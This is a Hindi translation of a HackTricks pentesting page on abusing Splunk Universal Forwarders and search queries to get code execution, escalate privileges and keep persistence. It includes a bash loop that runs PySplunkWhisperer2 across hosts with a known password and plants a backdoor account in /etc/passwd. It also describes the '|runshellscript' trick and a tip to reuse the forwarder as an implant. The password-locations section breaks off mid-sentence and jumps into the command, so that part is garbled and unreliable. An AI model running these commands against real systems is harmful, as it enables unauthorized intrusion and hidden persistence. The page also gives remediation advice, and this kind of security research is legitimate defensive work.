# Splunk LPE और पर्सिस्टेंस

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें**.
* **HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपोज़ में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>

यदि आप **आंतरिक रूप से** या **बाहरी रूप से** मशीन का **एन्युमरेशन** करते समय **Splunk चलते हुए पाते हैं** (पोर्ट 8090), और यदि आपको कोई **मान्य क्रेडेंशियल्स** पता हैं, तो आप **Splunk सर्विस का दुरुपयोग करके** **शेल को एक्जीक्यूट** कर सकते हैं जैसे Splunk चलाने वाले यूजर के रूप में। अगर रूट इसे चला रहा है, तो आप रूट तक प्रिविलेज एस्कलेट कर सकते हैं।

यदि आप **पहले से ही रूट हैं और Splunk सर्विस केवल localhost पर सुन नहीं रही है**, तो आप **Splunk सर्विस से** **पासवर्ड** फाइल **चुरा** सकते हैं और पासवर्ड्स को **क्रैक** कर सकते हैं, या उसमें **नए** क्रेडेंशियल्स **जोड़** सकते हैं। और होस्ट पर पर्सिस्टेंस बनाए रख सकते हैं।

नीचे दी गई पहली इमेज में आप देख सकते हैं कि Splunkd वेब पेज कैसा दिखता है।

**निम्नलिखित जानकारी** [**https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/**](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) **से कॉपी की गई है**

## Splunk Forwarders का दुरुपयोग शेल्स और पर्सिस्टेंस के लिए

14 अगस्त 2020

### विवरण: <a href="#description" id="description"></a>

Splunk Universal Forwarder Agent (UF) प्रमाणित दूरस्थ उपयोगकर्ताओं को Splunk API के माध्यम से एजेंटों को एकल कमांड या स्क्रिप्ट भेजने की अनुमति देता है। UF एजेंट यह नहीं जांचता कि आने वाले कनेक्शन एक मान्य Splunk Enterprise सर्वर से हैं, न ही UF एजेंट कोड को सत्यापित करता है कि वह साइन किया गया है या अन्यथा Splunk Enterprise सर्वर से साबित होता है। यह एक हमलावर को जो UF एजेंट पासवर्ड तक पहुंच प्राप्त करता है, सर्वर पर ऑपरेटिंग सिस्टम के आधार पर SYSTEM या रूट के रूप में मनमाने कोड चलाने की अनुमति देता है।

यह हमला पेनेट्रेशन टेस्टर्स द्वारा उपयोग किया जा रहा है और संभवतः दुर्भावनापूर्ण हमलावरों द्वारा जंगली में सक्रिय रूप से शोषित किया जा रहा है। पासवर्ड प्राप्त करना ग्राहक के वातावरण में सैकड़ों सिस्टम के समझौते की ओर ले जा सकता है।

Splunk UF पासवर्ड प्राप्त करना अपेक्षाकृत आसान है, विवरण के लिए सेक्शन Common Password Locations देखें।

### संदर्भ: <a href="#context" id="context"></a>

Splunk एक डेटा एग्रीगेशन और सर्च टूल है जिसे अक्सर सिक्योरिटी इन्फॉर्मेशन और इवेंट मॉनिटरिंग (SIEM) सिस्टम के रूप में उपयोग किया जाता है। Splunk Enterprise Server एक वेब एप्लिकेशन है जो एक सर्वर पर चलता है, जिसमें एजेंट होते हैं, जिन्हें Universal Forwarders कहा जाता है, जो नेटवर्क में प्रत्येक सिस्टम पर स्थापित किए जाते हैं। Splunk Windows, Linux, Mac, और Unix के लिए एजेंट बाइनरीज प्रदान करता है। कई संगठन Linux/Unix होस्ट्स पर एजेंट स्थापित करने के बजाय Syslog का उपयोग करके Splunk को डेटा भेजते हैं लेकिन एजेंट स्थापना बढ़ती हुई लोकप्रियता प्राप्त कर रही है।

Universal Forwarder प्रत्येक होस्ट पर https://host:8089 पर सुलभ है। किसी भी सुरक्षित API कॉल्स, जैसे कि /service/ तक पहुंचने पर एक Basic प्रमाणीकरण बॉक्स पॉप अप होता है। उपयोगकर्ता नाम हमेशा admin होता है, और पासवर्ड डिफ़ॉल्ट changeme हुआ करता था जब तक कि 2016 में Splunk ने किसी भी नए स्थापना के लिए 8 अक्षर या उससे अधिक का पासवर्ड सेट करने की आवश्यकता नहीं की। जैसा कि आप मेरे डेमो में नोट करेंगे, जटिलता एक आवश्यकता नहीं है क्योंकि मेरा एजेंट पासवर्ड 12345678 है। एक दूरस्थ हमलावर बिना लॉकआउट के पासवर्ड को ब्रूट फोर्स कर सकता है, जो कि एक लॉग होस्ट की आवश्यकता है, क्योंकि अगर खाता लॉक हो गया तो लॉग अब Splunk सर्वर को नहीं भेजे जाएंगे और एक हमलावर इसका उपयोग अपने हमलों को छिपाने के लिए कर सकता है। निम्नलिखित स्क्रीनशॉट Universal Forwarder एजेंट को दिखाता है, यह प्रारंभिक पृष्ठ प्रमाणीकरण के बिना सुलभ है और Splunk Universal Forwarder चलाने वाले होस्ट्स को गिनने के लिए उपयोग किया जा सकता है।

![0](https://eapolsniper.github.io/assets/2020AUG14/11\_SplunkAgent.png)

Splunk दस्तावेज़ीकरण सभी एजेंटों के लिए एक ही Universal Forwarding पासवर्ड का उपयोग करने को दिखाता है, मुझे याद नहीं है कि यह एक आवश्यकता है या यदि प्रत्येक एजेंट के लिए व्यक्तिगत पासवर्ड सेट किए जा सकते हैं, लेकिन दस्तावेज़ीकरण और मेरी याददाश्त से जब मैं Splunk व्यवस्थापक था, मुझे विश्वास है कि सभी एजेंटों को एक ही पासवर्ड का उपयोग करना होगा। इसका मतलब है कि अगर पासवर्ड एक सिस्टम पर पाया या क्रैक किया जाता है, तो यह सभी Splunk UF होस्ट्स पर काम करने की संभावना है। यह मेरा व्यक्तिगत अनुभव रहा है, जिससे सैकड़ों होस्ट्स का तेजी से समझौता हो सकता है।

### सामान्य पासवर्ड स्थान <a href="#common-password-locations" id="common-password-locations"></a>

मैं अक्सर नेटवर्क पर निम्नलिखित स्थानों पर Splunk Universal Forwarding एजेंट का प्लेन टेक्स्ट पासवर्ड पाता हूं:

1. Active Directory Sysvol/domain.com/Scripts निर्देशिका। प्रशासक कुशल ए
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
मेज़बान जानकारी:

Splunk Enterprise Server: 192.168.42.114\
Splunk Forwarder Agent पीड़ित: 192.168.42.98\
हमलावर: 192.168.42.51

Splunk Enterprise संस्करण: 8.0.5 (12 अगस्त, 2020 को लैब सेटअप के दिन तक नवीनतम)\
Universal Forwarder संस्करण: 8.0.5 (12 अगस्त, 2020 को लैब सेटअप के दिन तक नवीनतम)

#### Splunk, Inc के लिए सुधार सिफारिशें: <a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>

मैं निम्नलिखित समाधानों को लागू करने की सिफारिश करता हूँ जो गहराई में रक्षा प्रदान करेंगे:

1. आदर्श रूप से, Universal Forwarder एजेंट का कोई भी पोर्ट खुला नहीं होगा, बल्कि यह नियमित अंतराल पर Splunk सर्वर से निर्देशों के लिए पोल करेगा।
2. क्लाइंट्स और सर्वर के बीच TLS म्यूचुअल प्रमाणीकरण को सक्षम करें, प्रत्येक क्लाइंट के लिए व्यक्तिगत कुंजियों का उपयोग करते हुए। यह सभी Splunk सेवाओं के बीच बहुत उच्च द्विपक्षीय सुरक्षा प्रदान करेगा। TLS म्यूचुअल प्रमाणीकरण एजेंट्स और IoT उपकरणों में भारी रूप से लागू किया जा रहा है, यह विश्वसनीय डिवाइस क्लाइंट से सर्वर संचार का भविष्य है।
3. सभी कोड, एकल पंक्ति या स्क्रिप्ट फाइलों को, एक संपीड़ित फाइल में भेजें जो Splunk सर्वर द्वारा एन्क्रिप्टेड और हस्ताक्षरित हो। यह API के माध्यम से भेजे गए एजेंट डेटा की सुरक्षा नहीं करता है, लेकिन तीसरे पक्ष से मलिशियस रिमोट कोड एक्जीक्यूशन के खिलाफ सुरक्षा करता है।

#### Splunk ग्राहकों के लिए सुधार सिफारिशें: <a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>

1. Splunk एजेंट्स के लिए एक बहुत मजबूत पासवर्ड सेट करना सुनिश्चित करें। मैं कम से कम 15-अक्षर यादृच्छिक पासवर्ड की सिफारिश करता हूँ, लेकिन चूंकि ये पासवर्ड कभी टाइप नहीं किए जाते हैं, इसे 50 अक्षरों जैसे बहुत बड़े पासवर्ड पर सेट किया जा सकता है।
2. होस्ट आधारित फायरवॉल को कॉन्फ़िगर करें ताकि केवल Splunk सर्वर से 8089/TCP पोर्ट (Universal Forwarder Agent का पोर्ट) पर कनेक्शन की अनुमति हो।

### Red Team के लिए सिफारिशें: <a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>

1. प्रत्येक ऑपरेटिंग सिस्टम के लिए Splunk Universal Forwarder की एक प्रति डाउनलोड करें, क्योंकि यह एक बहुत अच्छा हल्का वजन वाला हस्ताक्षरित इम्प्लांट है। अच्छा होगा अगर Splunk वास्तव में इसे ठीक करता है तो एक प्रति रखें।

### अन्य शोधकर्ताओं से Exploits/Blogs <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>

सार्वजनिक रूप से उपयोगी exploits:

* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487

संबंधित ब्लॉग पोस्ट:

* https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
* https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2
* https://www.hurricanelabs.com/splunk-tutorials/using-splunk-as-an-offensive-security-tool

_\*\* नोट: \*\*_ यह मुद्दा Splunk सिस्टम्स के साथ एक गंभीर मुद्दा है और इसका अन्य परीक्षकों द्वारा वर्षों से शोषण किया गया है। जबकि Remote Code Execution Splunk Universal Forwarder की एक इरादा की गई सुविधा है, इसका कार्यान्वयन खतरनाक है। मैंने इस बग को Splunk के बग इनाम कार्यक्रम के माध्यम से सबमिट करने की कोशिश की, बहुत कम संभावना में कि वे डिजाइन प्रभावों के बारे में अवगत नहीं हैं, लेकिन मुझे सूचित किया गया कि किसी भी बग सबमिशन को Bug Crowd/Splunk प्रकटीकरण नीति को लागू करना होगा जो कहता है कि कमजोरी के विवरण को कभी भी सार्वजनिक रूप से चर्चा नहीं की जा सकती है _कभी_ Splunk की अनुमति के बिना। मैंने 90 दिनों की प्रकटीकरण समयरेखा का अनुरोध किया और इनकार कर दिया गया। इस तरह, मैंने इसे जिम्मेदारी से प्रकट नहीं किया क्योंकि मैं काफी निश्चित हूँ कि Splunk इस मुद्दे के बारे में जानता है और इसे अनदेखा करने का चुनाव किया है, मुझे लगता है कि यह कंपनियों को गंभीरता से प्रभावित कर सकता है, और यह इन्फोसेक समुदाय की जिम्मेदारी है कि व्यापारों को शिक्षित करें।

## Splunk Queries का दुरुपयोग

जानकारी [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) से

**CVE-2023-46214** ने **`$SPLUNK_HOME/bin/scripts`** में एक मनमानी स्क्रिप्ट अपलोड करने की अनुमति दी और फिर बताया कि सर्च क्वेरी **`|runshellscript script_name.sh`** का उपयोग करके वहां संग्रहीत **स्क्रिप्ट** को **निष्पादित** करना संभव था:

<figure><img src="../../.gitbook/assets/image (721).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong>!</summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित हो** या **HackTricks को PDF में डाउनलोड करें** तो [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा [**NFTs**](https://opensea.io/collection/the-peass-family) का विशेष संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में अपनी हैकिंग ट्रिक्स साझा करके PRs सबमिट करें।

</details>
